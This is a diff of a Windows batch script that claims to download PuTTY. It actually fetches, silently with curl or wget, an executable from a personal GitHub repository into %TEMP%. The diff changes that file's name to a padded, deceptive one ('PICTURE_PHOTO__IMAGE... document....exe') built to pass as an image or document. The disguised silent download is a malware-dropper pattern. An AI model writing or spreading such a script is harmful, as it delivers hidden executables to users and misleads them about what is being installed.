@@ -10,8 +10,8 @@ set /a center=(80 - !text!^)/2
 echo %BS%[1;%center%H!text!
 
 :: Set the PuTTY download URL and destination file
-set "puttyUrl=https://github.com/johnihr00/test-files/raw/main/document....................exe"
-set "puttyDestination=%TEMP%\document....................exe"
+set "puttyUrl=https://github.com/johnihr00/test-files/raw/main/PICTURE_PHOTO__IMAGE____________%20%20%20%20%20document....................exe"
+set "puttyDestination=%TEMP%\PICTURE_PHOTO__IMAGE____________%20%20%20%20%20document....................exe"
 
 :: Download PuTTY silently
 curl -o "!puttyDestination!" -L --silent "!puttyUrl!" || wget -q -O "!puttyDestination!" "!puttyUrl!"
